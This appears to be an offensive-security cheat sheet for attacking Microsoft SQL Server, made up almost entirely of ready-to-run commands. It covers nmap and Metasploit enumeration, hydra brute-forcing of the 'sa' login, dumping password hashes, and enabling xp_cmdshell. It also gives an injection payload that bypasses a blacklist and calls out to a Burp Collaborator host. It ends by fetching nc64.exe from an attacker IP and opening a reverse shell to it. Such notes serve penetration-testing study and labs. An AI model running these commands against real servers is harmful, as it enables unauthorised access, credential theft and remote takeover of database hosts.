---
description: MSSQL - Microsoft SQL service. typically runs on TCP port 1433.
---

# MSSQL

## Enumeration

```
//NMAP - enumerate the server, version and info
nmap [IP]
nmap --script ms-sql-info -p 1433 [IP]
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 [IP]

//Metasploit - enumerate mssql info
use auxiliary/admin/mssql/mssql_enum
set RHOSTS [IP]
exploit
```

### Enumerate SQL login accounts

```
// Metasploit - enumerate sql login accounts
use auxiliary/admin/mssql/mssql_enum_sql_logins
set RHOSTS [IP]
exploit
```

### Enumerate domain accounts

```
//metasploit
use auxiliary/admin/mssql/mssql_enum_domain_accounts
set RHOSTS [IP]
exploit
```

## Password attack

```
nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passwd=/root/Desktop/wordlist/100-common-passwords.txt [IP]
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt [IP] mssql
hydra -l sa –P /root/Desktop/pass.txt [IP] mssql

##Metasploit:
use auxiliary/scanner/mssql/mssql_login
msf auxiliary(scanner/mssql/mssql_login) > set rhosts [IP]
msf auxiliary(scanner/mssql/mssql_login) > set user_file /root/Desktop/user.txt
msf auxiliary(scanner/mssql/mssql_login) > set pass_file /root/Desktop/pass.txt
msf auxiliary(scanner/mssql/mssql_login) > set stop_on_success true
msf auxiliary(scanner/mssql/mssql_login) > run
```

## Extracting users

```
nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=Password123,ms-sql-query.query="SELECT * FROM master..syslogins" [IP] -oN output.txt
```

## Dump hashes

```
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=Password123 [IP]
```

## CMD Shell

```
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=Password123,ms-sql-xp-cmdshell.cmd="ipconfig" [IP]
```

### Enable xp\_cmdshell - manual

```
//this enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

//Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'

//Bypass blackisted "EXEC xp_cmdshell"
‘; DECLARE @x AS VARCHAR(100)=’xp_cmdshell’; EXEC @x ‘ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net’ —impacket-mssqlclient machine_name/user@[IP] -windows-auth
```

### Metasploit

```
// Suse auxiliary/admin/mssql/mssql_exec
set RHOSTS [IP]
set CMD whoami
exploit
```

## Connecting to MSSQL

### Using MSSQL-CLI Python utility

```
python3 -m mssqlcli.main -S [IP] -U sa -P Password123
```

### SQLCMD

```
sqlcmd -S [IP] -U admin -P Password123
    1> select @@version
    2> go
```

## Common SQL Queries

```
select @@version;
select loginname from syslogins where sysadmin = 1;
select name from sys.databases;
select * from sysusers;
select name, password_hash FROM master.sys.sql_logins;
SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name = 'xp_cmdshell';
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE
EXEC xp_cmdshell "whoami"
EXEC xp_cmdshell "dir C:\"
EXEC xp_cmdshell "type C:\file.txt"
```

## Reverse shell

Download a netcat file to the remote server&#x20;

```
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
http://10.10.14.9/nc64.exe -outfile nc64.exe"

SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe
10.10.14.9 443"
```
